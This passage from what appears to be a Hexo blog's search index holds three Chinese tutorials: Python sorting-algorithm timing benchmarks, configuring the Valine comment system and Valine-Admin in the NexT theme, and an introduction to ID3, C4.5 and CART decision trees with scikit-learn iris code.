sort(a,low,i) sort(a,j,high)def QuickSort3Ways(nums): low = 0 high = len(nums)-1 sort(nums,low,high) return numsnums = [4,5,6,1,2,3,3,3,1,2]print(QuickSort(nums))快速排序和归并排序对比快速排序和归并排序是互补的：归并排序：将数组分成两个子数组分别排序，并将有序的子数组归并以将整个数组排序；递归调用发生在处理整个数组之前；一个数组被等分为两半。快速排序：当两个子数组都有序时，整个数组也就自然有序了；递归调用发生在处理整个数组之后；切分（partition）的位置取决于数组的内容。各大排序算法测试下面我们对各大排序算法在不同数据集上进行对比，看看它们的优劣。计时函数不同数据集可以用同一个计时函数，具体如下：12345678910111213141516171819import time# 计时函数def count_time(a,sortname): time_start = time.time() if sortname == 'BubbleSort': BubbleSort(a) if sortname == 'SelectSort': SelectSort(a) if sortname == 'InsertSort': InsertSort(a) if sortname == 'MergeSort': MergeSort(a) if sortname == 'QuickSort': QuickSort(a) if sortname == 'QuickSort3Ways': QuickSort3Ways(a) time_end = time.time() return (time_end - time_start)随机数据集随机数据生成器：123456789101112import randomdef timeRandomInput(sortname,length,numberOfArrays): totalTime = 0 #测试数组数 for _ in range(numberOfArrays): #数组大小 a = [] for _ in range(length): a.append(random.randint(1, 1000000)) # 测试数据范围 totalTime += count_time(a,sortname) return totalTime这里我们生成一个长度为5000的数组，然后重复测试10次，最后计算各个排序算法用时：1234567891011121314151617181920length = 5000numberOfArrays = 10print("BubbleSort's total time:")print(timeRandomInput('BubbleSort',length,numberOfArrays))print("SelectSort's total time:")print(timeRandomInput('SelectSort',length,numberOfArrays))print("InsertSort's total time:")print(timeRandomInput('InsertSort',length,numberOfArrays))print("MergeSort's total time:")print(timeRandomInput('MergeSort',length,numberOfArrays))print("QuickSort's total time:")print(timeRandomInput('QuickSort',length,numberOfArrays))print("QuickSort3Ways's total time:")print(timeRandomInput('QuickSort3Ways',length,numberOfArrays))123456789101112BubbleSort&apos;s total time:30.023681640625SelectSort&apos;s total time:11.03202223777771InsertSort&apos;s total time:24.185371160507202MergeSort&apos;s total time:0.1900651454925537QuickSort&apos;s total time:0.1554875373840332QuickSort3Ways&apos;s total time:0.19011521339416504降序数据集这里我们看下这些排序算法在降序数据集下的表现，首先改变数据生成函数：12345678910111213import randomdef timeRandomInput(sortname,length,numberOfArrays): totalTime = 0 #测试数组数 for _ in range(numberOfArrays): #数组大小 a = [] for _ in range(length): a.append(random.randint(1, 1000000)) # 测试数据范围+ a.sort(reverse = True) totalTime += count_time(a,sortname) return totalTime这里如果生成一个长度为10000的数组，快速排序会出现RecursionError: maximum recursion depth exceeded in comparison错误。这个因为Python中默认的最大递归深度是989。解决方案：手动设置递归调用深度，具体代码如下：12345678910111213141516import random+import sys+sys.setrecursionlimit(1000000)def timeRandomInput(sortname,length,numberOfArrays): totalTime = 0 #测试数组数 for _ in range(numberOfArrays): #数组大小 a = [] for _ in range(length): a.append(random.randint(1, 1000000)) # 测试数据范围 a.sort(reverse = True) totalTime += count_time(a,sortname) return totalTime数组大小改变为5000，重复10次，下面是测试结果：123456789101112BubbleSort&apos;s total time:45.00776267051697SelectSort&apos;s total time:11.393858909606934InsertSort&apos;s total time:48.275355100631714MergeSort&apos;s total time:0.18087530136108398QuickSort&apos;s total time:14.895536661148071QuickSort3Ways&apos;s total time:0.10853052139282227升序数据集这里我们看下这些排序算法在升序数据集下的表现，首先改变数据生成函数：12345678910111213141516import randomimport syssys.setrecursionlimit(1000000)def timeRandomInput(sortname,length,numberOfArrays): totalTime = 0 #测试数组数 for _ in range(numberOfArrays): #数组大小 a = [] for _ in range(length): a.append(random.randint(1, 1000000)) # 测试数据范围+ a.sort(reverse = False) totalTime += count_time(a,sortname) return totalTime同样的，这里数组大小为5000，重复10次，下面是测试结果：123456789101112BubbleSort&apos;s total time:14.935291051864624SelectSort&apos;s total time:11.371372699737549InsertSort&apos;s total time:0.008459329605102539MergeSort&apos;s total time:0.15901756286621094QuickSort&apos;s total time:16.011647939682007QuickSort3Ways&apos;s total time:0.10053849220275879含有大量重复数的数组这里我们看下这些排序算法在含有大量重复数的数据集下的表现，首先改变数据生成函数：12345678910111213141516import randomimport syssys.setrecursionlimit(1000000)def timeRandomInput(sortname,length,numberOfArrays): totalTime = 0 #测试数组数 for _ in range(numberOfArrays): #数组大小 a = [] for _ in range(length):- a.append(random.randint(1, 1000000)) # 测试数据范围+ a.append(random.randint(999990, 1000000)) # 测试数据范围 totalTime += count_time(a,sortname) return totalTime同样的，这里数组大小为5000，重复10次，下面是测试结果：123456789101112BubbleSort&apos;s total time:28.813392877578735SelectSort&apos;s total time:11.362754821777344InsertSort&apos;s total time:22.454782247543335MergeSort&apos;s total time:0.1563563346862793QuickSort&apos;s total time:0.15424251556396484QuickSort3Ways&apos;s total time:0.08862972259521484总结BubbleSortSelectSortInsertSortMergeSortQuickSortQuickSort3Ways随机数据集30.02311.03224.1850.1900.1550.190升序数据集14.93511.3710.0080.15916.0110.100降序数据集45.00711.39348.2750.18014.8950.108大量重复数的数据集28.81311.36222.4540.1560.1540.088经过优化后的三路快速排序在升序、降序、包含大量重复数的情况下表现均非常优异。参考快速排序算法的优化思路总结快速排序C++及Python实现及优化快速排序 三平均划分快速排序一步一步优化]]></content>
      <categories>
        <category>计算机基础</category>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo-NexT配置Valine]]></title>
    <url>%2Farchives%2Fed8b904f.html</url>
    <content type="text"><![CDATA[我之前用的是Disqus这个评论服务，但是它需要科学上网才能使用，不利于交流，所以我准备换用Valine这个评论服务。LeanCloud注册Valine用LeanCloud作为数据库，所以我们需要注册一个LeanCloud账号。注册完以后需要创建一个应用，然后 进入应用-&gt;设置-&gt;应用key，得到appid、appkey。在LeanCloud -&gt; 存储 -&gt; 创建Class -&gt; 无限制的Class，class名称为：Comment，这是用来存放评论信息的。在LeanCloud-设置，把除数据存储外其他选项都关闭。注意：我们需要在Leancloud -&gt; 设置 -&gt; 安全中心 -&gt; Web 安全域名把你的域名加进去。NexT配置由于NexT 7.1.2已经内置了Valine，所以我们只需要进行简单的配置即可。12345678910111213141516# Valine# You can get your appid and appkey from https://leancloud.cn# More info available at https://valine.js.orgvaline: enable: true # When enable is set to be true, leancloud_visitors is recommended to be closed for the re-initialization problem within different leancloud adk version. appid: # your leancloud application appid appkey: # your leancloud application appkey notify: false # mail notifier, See: https://github.com/xCss/Valine/wiki verify: false # Verification code placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!' # comment box placeholder avatar: mm # gravatar style guest_info: nick,mail,link # custom comment header pageSize: 10 # pagination size language: zh-cn # language, available values: en, zh-cn visitor: true # leancloud-counter-security is not supported for now. When visitor is set to be true, appid and appkey are recommended to be the same as leancloud_visitors' for counter compatibility. Article reading statistic https://valine.js.org/visitor.html comment_count: true # if false, comment count will only be displayed in post page, not in home page主要就是填入前一步得到的appid、appkey。然后由于我后面要用更完善的第三方邮件提醒Valine-Admin，所以这里我关闭了自带的邮件提醒notify。由于自带的CDN加载很慢，所以这里我们在NexT配置文件_config.yml中改成第三方CDN：1234567vendors: # valine # See: https://github.com/xCss/Valine # Example: # valine: //cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js # valine: //cdnjs.cloudflare.com/ajax/libs/valine/1.3.4/Valine.min.js valine: //cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js到目前为止，我们就可以正常使用Valine了。下面是一些可选的高级配置，比如我想要评论后得到邮件通知、垃圾邮件过滤，那就需要配置Valine Admin。Valine Admin 配置Valine Admin 是 Valine 评论系统的扩展和增强，主要实现评论邮件通知、评论管理、垃圾评论过滤等功能。支持完全自定义的邮件通知模板。基于Akismet API实现准确的垃圾评论过滤。此外，使用云函数等技术解决了免费版云引擎休眠问题，支持云引擎自动唤醒，漏发邮件自动补发。兼容云淡风轻及Deserts维护的多版本Valine。云引擎”一键”部署在Leancloud云引擎设置界面，填写代码库并保存：https://github.com/DesertsP/Valine-Admin.git在设置页面，设置环境变量以及 Web 二级域名：环境变量：变量示例说明SITE_NAME小丁的个人博客[必填]博客名称SITE_URLhttps://tding.top/[必填]首页地址SMTP_SERVICEQQ[新版支持]邮件服务提供商，支持 QQ、163、126、Gmail 以及 更多SMTP_USERxxxxxx@qq.com[必填]SMTP登录用户SMTP_PASSccxxxxxxxxch[必填]SMTP登录密码（QQ邮箱需要获取独立密码）SENDER_NAMEtding[必填]发件人SENDER_EMAILxxxxxx@qq.com[必填]发件邮箱ADMIN_URLhttps://tding.avosapps.us/[建议]Web主机二级域名，用于自动唤醒BLOGGER_EMAILxxxxx@gmail.com[可选]博主通知收件地址，默认使用SENDER_EMAILAKISMET_KEYxxxxxxxxxxxx[可选]Akismet Key 用于垃圾评论检测，设为MANUAL_REVIEW开启人工审核，留空不使用反垃圾二级域名用于评论后台管理：例如https://tding.avosapps.us/切换到部署标签页，分支使用master，点击部署即可，第一次部署需要花点时间。评论管理。访问设置的二级域名https://二级域名.avosapps.us/sign-up，注册管理员登录信息，如：https://tding.avosapps.us/sign-up。此后，可以通过https://tding.avosapps.us/管理评论。定时任务设置目前实现了两种云函数定时任务：(1)自动唤醒，定时访问Web APP二级域名防止云引擎休眠；(2)每天定时检查24小时内漏发的邮件通知。进入云引擎-定时任务中，创建定时器，创建两个定时任务。选择self-wake云函数，Cron表达式为0 0/30 7-23 * * ?，表示每天早6点到晚23点每隔30分钟访问云引擎，ADMIN_URL环境变量务必设置正确选择resend-mails云函数，Cron表达式为0 0 8 * * ?，表示每天早8点检查过去24小时内漏发的通知邮件并补发添加定时器后记得点击启动方可生效。至此，Valine Admin 已经可以正常工作，更多以下是可选的进阶配置。邮件通知模板邮件通知模板在云引擎环境变量中设定，可自定义通知邮件标题及内容模板。环境变量示例说明MAIL_SUBJECT${PARENT_NICK}，您在${SITE_NAME}上的评论收到了回复[可选]@通知邮件主题（标题）模板MAIL_TEMPLATE见下文[可选]@通知邮件内容模板MAIL_SUBJECT_ADMIN${SITE_NAME}上有新评论了[可选]博主邮件通知主题模板MAIL_TEMPLATE_ADMIN见下文[可选]博主邮件通知内容模板邮件通知包含两种，分别是被@通知（上面的MAIL_TEMPLATE）和博主通知（上面的MAIL_TEMPLATE_ADMIN），这两种模板都可以完全自定义。默认使用经典的蓝色风格模板。默认被@通知邮件内容模板如下：1&lt;div style=&quot;border-top:2px solid #12ADDB;box-shadow:0 1px 3px #AAAAAA;line-height:180%;padding:0 15px 12px;margin:50px auto;font-size:12px;&quot;&gt;&lt;h2 style=&quot;border-bottom:1px solid #DDD;font-size:14px;font-weight:normal;padding:13px 0 10px 8px;&quot;&gt;您在&lt;a style=&quot;text-decoration:none;color: #12ADDB;&quot; href=&quot;$&#123;SITE_URL&#125;&quot; target=&quot;_blank&quot;&gt; $&#123;SITE_NAME&#125;&lt;/a&gt;上的评论有了新的回复&lt;/h2&gt; $&#123;PARENT_NICK&#125; 同学，您曾发表评论：&lt;div style=&quot;padding:0 12px 0 12px;margin-top:18px&quot;&gt;&lt;div style=&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt; $&#123;PARENT_COMMENT&#125;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;$&#123;NICK&#125;&lt;/strong&gt;回复说：&lt;/p&gt;&lt;div style=&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt; $&#123;COMMENT&#125;&lt;/div&gt;&lt;p&gt;您可以点击&lt;a style=&quot;text-decoration:none; color:#12addb&quot; href=&quot;$&#123;POST_URL&#125;&quot; target=&quot;_blank&quot;&gt;查看回复的完整內容&lt;/a&gt;，欢迎再次光临&lt;a style=&quot;text-decoration:none; color:#12addb&quot; href=&quot;$&#123;SITE_URL&#125;&quot; target=&quot;_blank&quot;&gt;$&#123;SITE_NAME&#125;&lt;/a&gt;。&lt;br&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;默认博主通知邮件内容模板如下：1&lt;div style=&quot;border-top:2px solid #12ADDB;box-shadow:0 1px 3px #AAAAAA;line-height:180%;padding:0 15px 12px;margin:50px auto;font-size:12px;&quot;&gt;&lt;h2 style=&quot;border-bottom:1px solid #DDD;font-size:14px;font-weight:normal;padding:13px 0 10px 8px;&quot;&gt;您在&lt;a style=&quot;text-decoration:none;color: #12ADDB;&quot; href=&quot;$&#123;SITE_URL&#125;&quot; target=&quot;_blank&quot;&gt;$&#123;SITE_NAME&#125;&lt;/a&gt;上的文章有了新的评论&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;$&#123;NICK&#125;&lt;/strong&gt;回复说：&lt;/p&gt;&lt;div style=&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt; $&#123;COMMENT&#125;&lt;/div&gt;&lt;p&gt;您可以点击&lt;a style=&quot;text-decoration:none; color:#12addb&quot; href=&quot;$&#123;POST_URL&#125;&quot; target=&quot;_blank&quot;&gt;查看回复的完整內容&lt;/a&gt;&lt;br&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;这里还提供一个彩虹风格的@通知邮件模板代码：1&lt;div style=&quot;border-radius: 10px 10px 10px 10px;font-size:13px; color: #555555;width: 666px;font-family:&apos;Century Gothic&apos;,&apos;Trebuchet MS&apos;,&apos;Hiragino Sans GB&apos;,微软雅黑,&apos;Microsoft Yahei&apos;,Tahoma,Helvetica,Arial,&apos;SimSun&apos;,sans-serif;margin:50px auto;border:1px solid #eee;max-width:100%;background: #ffffff repeating-linear-gradient(-45deg,#fff,#fff 1.125rem,transparent 1.125rem,transparent 2.25rem);box-shadow: 0 1px 5px rgba(0, 0, 0, 0.15);&quot;&gt;&lt;div style=&quot;width:100%;background:#49BDAD;color:#ffffff;border-radius: 10px 10px 0 0;background-image: -moz-linear-gradient(0deg, rgb(67, 198, 184), rgb(255, 209, 244));background-image: -webkit-linear-gradient(0deg, rgb(67, 198, 184), rgb(255, 209, 244));height: 66px;&quot;&gt;&lt;p style=&quot;font-size:15px;word-break:break-all;padding: 23px 32px;margin:0;background-color: hsla(0,0%,100%,.4);border-radius: 10px 10px 0 0;&quot;&gt;您在&lt;a style=&quot;text-decoration:none;color: #ffffff;&quot; href=&quot;$&#123;SITE_URL&#125;&quot;&gt; $&#123;SITE_NAME&#125;&lt;/a&gt;上的留言有新回复啦！&lt;/p&gt;&lt;/div&gt;&lt;div style=&quot;margin:40px auto;width:90%&quot;&gt;&lt;p&gt;$&#123;PARENT_NICK&#125; 同学，您曾在文章上发表评论：&lt;/p&gt;&lt;div style=&quot;background: #fafafa repeating-linear-gradient(-45deg,#fff,#fff 1.125rem,transparent 1.125rem,transparent 2.25rem);box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);margin:20px 0px;padding:15px;border-radius:5px;font-size:14px;color:#555555;&quot;&gt;$&#123;PARENT_COMMENT&#125;&lt;/div&gt;&lt;p&gt;$&#123;NICK&#125; 给您的回复如下：&lt;/p&gt;&lt;div style=&quot;background: #fafafa repeating-linear-gradient(-45deg,#fff,#fff 1.125rem,transparent 1.125rem,transparent 2.25rem);box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);margin:20px 0px;padding:15px;border-radius:5px;font-size:14px;color:#555555;&quot;&gt;$&#123;COMMENT&#125;&lt;/div&gt;&lt;p&gt;您可以点击&lt;a style=&quot;text-decoration:none; color:#12addb&quot; href=&quot;$&#123;POST_URL&#125;#comments&quot;&gt;查看回复的完整內容&lt;/a&gt;，欢迎再次光临&lt;a style=&quot;text-decoration:none; color:#12addb&quot; href=&quot;$&#123;SITE_URL&#125;&quot;&gt; $&#123;SITE_NAME&#125;&lt;/a&gt;。&lt;/p&gt;&lt;style type=&quot;text/css&quot;&gt;a:link&#123;text-decoration:none&#125;a:visited&#123;text-decoration:none&#125;a:hover&#123;text-decoration:none&#125;a:active&#123;text-decoration:none&#125;&lt;/style&gt;&lt;/div&gt;&lt;/div&gt;我的环境变量配置Valine和“热榜”冲突问题这里Valine和热榜存在一定的冲突，导致了热榜中的文章无法正常显示。我们可以不在 热榜 页面加载 Valine 的代码，反正 热榜 页面也没开启评论。修改文件~/blog/themes/next/layout/_third-party/comments/valine.swig：12345678910111213141516171819202122232425262728293031323334353637+ &#123;% if theme.valine.enable and theme.valine.appid and theme.valine.appkey and page.title !=== '热榜' %&#125;&#123;% set leancloud_uri = '//cdn1.lncld.net/static/js/3.11.1/av-min.js' %&#125;&#123;% if theme.vendors.leancloud %&#125; &#123;% set leancloud_uri = theme.vendors.leancloud %&#125;&#123;% endif %&#125;&lt;script src="&#123;&#123; leancloud_uri &#125;&#125;"&gt;&lt;/script&gt;&#123;% set valine_uri = '//unpkg.com/valine/dist/Valine.min.js' %&#125;&#123;% if theme.vendors.valine %&#125; &#123;% set valine_uri = theme.vendors.valine %&#125;&#123;% endif %&#125;&lt;script src="&#123;&#123; valine_uri &#125;&#125;"&gt;&lt;/script&gt;&lt;script&gt; var GUEST = ['nick', 'mail', 'link']; var guest = '&#123;&#123; theme.valine.guest_info &#125;&#125;'; guest = guest.split(',').filter(function(item) &#123; return GUEST.indexOf(item) &gt; -1; &#125;); new Valine(&#123; el: '#comments', verify: &#123;&#123; theme.valine.verify &#125;&#125;, notify: &#123;&#123; theme.valine.notify &#125;&#125;, appId: '&#123;&#123; theme.valine.appid &#125;&#125;', appKey: '&#123;&#123; theme.valine.appkey &#125;&#125;', placeholder: '&#123;&#123; theme.valine.placeholder &#125;&#125;', avatar: '&#123;&#123; theme.valine.avatar &#125;&#125;', meta: guest, pageSize: '&#123;&#123; theme.valine.pageSize &#125;&#125;' || 10, visitor: &#123;&#123; theme.valine.visitor &#125;&#125;, lang: '&#123;&#123; theme.valine.language &#125;&#125;' || 'zh-cn' &#125;);&lt;/script&gt;+ &#123;% endif %&#125;上面的热榜要修改成你自己的标题名字。参考Valine Admin 配置手册在 NexT 中使用 Valine 评论系统]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NexT</tag>
        <tag>Valine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[决策树介绍]]></title>
    <url>%2Farchives%2F1059015.html</url>
    <content type="text"><![CDATA[决策树算法既可以作为分类算法，也可以作为回归算法，同时也特别适合集成学习比如随机森林。一、什么是决策树下面是一个通俗的决策树例子：女儿：多大年纪了？母亲：26。女儿：长的帅不帅？母亲：挺帅的。女儿：收入高不？母亲：不算很高，中等情况。女儿：是公务员不？母亲：是，在税务局上班呢。女儿：那好，我去见见。这个女孩的决策过程就是典型的分类树决策。相当于通过年龄、长相、收入和是否公务员对将男人分为两个类别：见和不见。假设这个女孩对男人的要求是：30岁以下、长相中等以上并且是高收入者或中等以上收入的公务员，那么这个可以用下图表示女孩的决策逻辑：上图完整表达了这个女孩决定是否见一个约会对象的策略，其中绿色节点表示判断条件，橙色节点表示决策结果，箭头表示在一个判断条件在不同情况下的决策路径，图中红色箭头表示了上面例子中女孩的决策过程。现在我们有那么多判断是否去见约会对象的条件，那么先判断哪个条件比较好呢？怎么准确的定量选择这个标准就是决策树算法的关键了。二、决策树ID3算法1970年代，一个叫昆兰的大牛找到了用信息论中的熵来度量决策树的决策选择过程，昆兰把这个算法叫做ID3。下面我们就看看ID3算法是怎么选择特征的。首先，我们需要熟悉信息论中熵的概念。熵度量了事物的不确定性，越不确定的事物，它的熵就越大。具体的，随机变量X的熵的表达式如下：$$H(X) = -\sum\limits_{i=1}^{n}p_i logp_i$$n代表X的n种不同的离散取值pi代表了X取值为i的概率log为以2或者e为底的对数。举个例子，比如X有2个可能的取值，而这两个取值各为1/2时X的熵最大，此时X具有最大的不确定性，对应熵为：$$H(X) = -(\frac{1}{2}log\frac{1}{2} + \frac{1}{2}log\frac{1}{2}) = log2$$如果一个值概率大于1/2，另一个值概率小于1/2，则不确定性减少，对应的熵也会减少。比如一个概率1/3，一个概率2/3，则对应熵为：$$H(X) = -(\frac{1}{3}log\frac{1}{3} + \frac{2}{3}log\frac{2}{3}) = log3 - \frac{2}{3}log2 &lt; log2)$$然后我们很容易推广到多个变量的联合熵，这里给出两个变量X和Y的联合熵表达式：$$H(X,Y) = -\sum\limits_{i=1}^{n}p(x_i,y_i)logp(x_i,y_i)$$有了联合熵，又可以得到条件熵的表达式H(X|Y)，条件熵类似于条件概率,它度量了在知道Y以后X剩下的不确定性。表达式如下：$$H(X|Y) = -\sum\limits_{i=1}^{n}p(x_i,y_i)logp(x_i|y_i) = \sum\limits_{j=1}^{n}p(y_j)H(X|y_j)$$我们刚才提到H(X)度量了X的不确定性，条件熵H(X|Y)度量了我们在知道Y以后X剩下的不确定性，H(X)-H(X|Y)则度量了X在知道Y以后不确定性减少程度，这个度量我们在信息论中称为互信息，记为I(X,Y)。在决策树ID3算法中叫做信息增益。ID3算法就是用信息增益来判断当前节点应该用什么特征来构建决策树。信息增益大，则越适合用来分类。1、信息增益的一个示例我们有如下数据：帅？性格好？身高？上进？嫁与否帅不好矮不上进不嫁不帅好矮上进不嫁帅好矮上进嫁不帅爆好高上进嫁帅不好矮上进不嫁帅不好矮上进不嫁帅好高不上进嫁不帅好中上进嫁帅爆好中上进嫁不帅不好高上进嫁帅好矮不上进不嫁帅好矮不上进不嫁从数据中可以看出嫁的个数为6个，占1/2，可以求得随机变量X（嫁与不嫁）的信息熵为：$$H(X) = -(\frac{1}{2}log\frac{1}{2} + \frac{1}{2}log\frac{1}{2}) = log2 = 0.301$$现在假如我知道了一个男生的身高信息。身高有三个可能的取值{矮，中，高}：矮包括{1,2,3,5,6,11,12}，嫁的个数为1个，不嫁的个数为6个中包括{8,9} ，嫁的个数为2个，不嫁的个数为0个高包括{4,7,10}，嫁的个数为3个，不嫁的个数为0个那么我们可以求出：$$H(Y|X=矮) = -(\frac{1}{7}log\frac{1}{7} + \frac{6}{7}log\frac{6}{7}) = 0.178$$$$H(Y|X=中) = -(1log1 + 0) = 0$$$$H(Y|X=高) = -(1log1 + 0) = 0$$$$P(X = 矮) = \frac{7}{12} , P(X = 中) = \frac{2}{12} , P(X = 高) = \frac{3}{12}$$则可以得出条件熵为：$$H(Y|X) = \frac{7}{12}0.178 + \frac{2}{12}0 + \frac{3}{12}*0 = 0.103$$我们知道信息熵与条件熵相减就是我们的信息增益，我们在知道了身高这个信息之后，信息增益是0.301-0.103=0.198。如果我对一个男生什么都不知道的话，决定是否嫁给他的不确定性有0.301这么大。当我们知道他的身高信息后，不确定度减少了0.198。假如其它特征我也全算了，信息增益是身高这个特征最大。那么身高对于我挑夫君是最重要的，知道了这个特征，嫁与不嫁的不确定度减少的是最多的。那么在这个决策树里面，身高就是最优特征，所以它被选作分裂特征。下面再进行递归计算信息增益，在此就不展示了。2、ID3算法的不足ID3算法没有考虑连续特征，比如长度，密度都是连续值，无法在ID3运用。这大大限制了ID3的用途。ID3算法采用信息增益大的特征优先建立决策树的节点。但是在相同条件下，取值比较多的特征比取值少的特征信息增益大。比如一个变量有2个值，各为1/2，另一个变量为3个值，各为1/3，其实他们都是完全不确定的变量，但是取3个值的比取2个值的信息增益大。ID3算法没有考虑缺失值的情况。ID3算法没有考虑过拟合的问题。三、决策树C4.5算法昆兰在C4.5算法中改进了ID3上述4个问题。1、连续特征离散化对于第一个不能处理连续特征的问题，C4.5的思路是将连续的特征离散化。比如m个样本有m个连续特征A，从小到大排列为${a_1,a_2,…,a_m}$，则C4.5取相邻两样本值的平均数，一共取得m-1个划分点，其中第i个划分点Ti表示为：$T_i = \frac{a_i+a_{i+1}}{2}$。对于这m-1个点，分别计算以该点作为二元分类点时的信息增益。然后选择信息增益最大的点作为该连续特征的二元离散分类点。比如取到的增益最大的点为at,则小于at的值为类别1，大于at的值为类别2，这样我们就做到了连续特征的离散化。要注意的是，与离散属性不同的是，如果当前节点为连续属性，则该属性后面还可以参与子节点的产生选择过程。2、信息增益比对于第二个信息增益作为标准容易偏向于取值较多的特征的问题。我们引入信息增益比，它是信息增益和特征熵的比值。$$I_R(D,A) = \frac{I(A,D)}{H_A(D)}$$其中D为样本特征输出的集合，A为样本特征，特征熵表达式如下：$$H_A(D) = -\sum\limits_{i=1}^{n}\frac{|D_i|}{|D|}log_2\frac{|D_i|}{|D|}$$其中n为特征A的类别数， Di为特征A的第i个取值对应的样本个数。|D|为样本个数。特征数越多的特征对应的特征熵越大，它作为分母，可以校正信息增益容易偏向于取值较多的特征的问题。3、剪枝对于第四个过拟合的问题，C4.5引入了正则化系数进行初步的剪枝。4、C4.5算法的不足由于决策树算法非常容易过拟合，因此对于生成的决策树必须要进行剪枝。剪枝的算法有非常多，C4.5的剪枝方法有优化的空间。思路主要是两种，一种是预剪枝，即在生成决策树的时候就决定是否剪枝。另一个是后剪枝，即先生成决策树，再通过交叉验证来剪枝。后面讲CART树的时候我们会专门讲决策树的减枝思路，主要采用的是后剪枝加上交叉验证选择最合适的决策树。C4.5生成的是多叉树，即一个父节点可以有多个节点。很多时候，在计算机中二叉树模型会比多叉树运算效率高。如果采用二叉树，可以提高效率。C4.5只能用于分类，如果能将决策树用于回归的话可以扩大它的使用范围。C4.5由于使用了熵模型，里面有大量的耗时的对数运算,如果是连续值还有大量的排序运算。如果能够加以模型简化可以减少运算强度但又不牺牲太多准确性的话，那就更好了。四、CART分类树算法无论是ID3还是C4.5,都是基于信息论的熵模型的，这里面会涉及大量的对数运算。能不能简化模型同时也不至于完全丢失熵模型的优点呢？CART分类树算法使用基尼系数来代替信息增益比，基尼系数代表了模型的不纯度，基尼系数越小，则不纯度越低，特征越好。在分类问题中，假设有K个类别，第k个类别的概率为pk，则基尼系数的表达式为：$$Gini(p) = \sum\limits_{k=1}^{K}p_k(1-p_k) = 1- \sum\limits_{k=1}^{K}p_k^2$$如果是二类分类问题，计算就更加简单了，如果属于第一个样本输出的概率是p，则基尼系数的表达式为：$$Gini(p) = 2p(1-p)$$对于二类分类，基尼系数和熵之半的曲线如下：从上图可以看出，基尼系数和熵之半的曲线非常接近，仅仅在45度角附近误差稍大。因此，基尼系数可以做为熵模型的一个近似替代。1、CART分类树多分类处理对于多分类的问题，CART分类树采用的思路是不停的二分离散特征。回忆下ID3或者C4.5，如果某个特征A被选取建立决策树节点，如果它有A1,A2,A3三种类别，我们会在决策树上一下建立一个三叉的节点。这样导致决策树是多叉树。但是CART分类树使用的方法不同，他采用的是不停的二分，还是这个例子，CART分类树会考虑把A分成{A1}和{A2,A3}, {A2}和{A1,A3}, {A3}和{A1,A2}三种情况，找到基尼系数最小的组合，比如{A2}和{A1,A3},然后建立二叉树节点，一个节点是{A2}对应的样本，另一个节点是{A1,A3}对应的节点。同时，由于这次没有把特征A的取值完全分开，后面我们还有机会在子节点继续选择到特征A来划分A1和A3。这和ID3或者C4.5不同，在ID3或者C4.5的一棵子树中，离散特征只会参与一次节点的建立。2、CART分类树连续值处理对于连续值处理，CART思想和C4.5是相同的，都是将连续的特征离散化。唯一的区别在于在选择划分点时的度量方式不同，C4.5使用的是信息增益比，则CART分类树使用的是基尼系数。具体的思路如下，比如m个样本的连续特征A有m个，从小到大排列为${a_1,a_2,…,a_m}$,则CART算法取相邻两样本值的平均数，一共取得m-1个划分点，其中第i个划分点Ti表示为：$T_i = \frac{a_i+a_{i+1}}{2}$。对于这m-1个点，分别计算以该点作为二元分类点时的基尼系数。选择基尼系数最小的点作为该连续特征的二元离散分类点。比如取到的基尼系数最小的点为at,则小于at的值为类别1，大于at的值为类别2，这样我们就做到了连续特征的离散化。要注意的是，与ID3或者C4.5处理离散属性不同的是，如果当前节点为连续属性，则该属性后面还可以参与子节点的产生选择过程。五、sklearn实现决策树这里我使用scikit-learn中的鸢尾花数据集作为例子来学习决策树算法。1、数据探索&#123;cmd1234567891011121314151617181920from sklearn.datasets import load_irisimport numpy as npimport matplotlib.pyplot as plt# 加载数据集iris = load_iris()# 数据特征：150行， 4列features = iris['data']# 对应的鸢尾花种类: 150个，三种鸢尾花分别用 0,1,2 表示target = iris['target']# 自定义4个特征的名称feature_names = iris.feature_namesfeature_names = ['花萼长度', '花萼宽度', '花瓣长度', '花瓣宽度']# 自定义三种鸢尾花的名称class_names = iris.target_namesclass_names = ['山鸢尾花', '变色鸢尾花', '维吉尼亚鸢尾花']为了更好的识别出鸢尾花特征和种类之间的关系，我们先通过以下代码画出鸢尾花的四个特征分别与鸢尾花种类的散点图。&#123;cmd123456789101112colors='rgby'# 生成散点图for i in range(4): plt.subplot(2, 2, i+1) plt.scatter(features[:,i], target, c=colors[i]) plt.xlabel(feature_names[i]) plt.ylabel('花的种类')plt.suptitle("特征和鸢尾花种类散点图")plt.tight_layout(pad=3, w_pad=2, h_pad=2)plt.show()2、sklearn实现决策树下面我们通过 sklearn 自带的决策树函数训练样本并画出决策树的图。&#123;cmd1234567891011121314151617from sklearn.model_selection import train_test_splitfrom sklearn import tree# 把样本分成训练集和测试集两部分, 两者比例为： 7:3X_train, X_test, y_train, y_test = train_test_split(features, target, test_size=0.3, random_state=42)# 创建决策树分类器clf = tree.DecisionTreeClassifier()# 训练决策树clf.fit(X=X_train, y=y_train)# 查看特征比重print("feature weight : ", clf.feature_importances_)# 查看决策树评分print("decision tree score : ", clf.score(X=X_test, y=y_test))12feature weight : [0. 0.01911002 0.42356658 0.5573234 ] decision tree score : 1.0下面使用 graphviz 出决策树的图：&#123;cmd1234567891011121314import graphvizdot_data = tree.export_graphviz( clf, out_file=None, feature_names=feature_names, class_names=class_names, filled=True, rounded=True, special_characters=True)graph = graphviz.Source(dot_data)graph.format = 'svg'graph.render('./DecisionTree.gv', view=True)六、参考张洋-算法杂货铺——分类算法之决策树(Decision 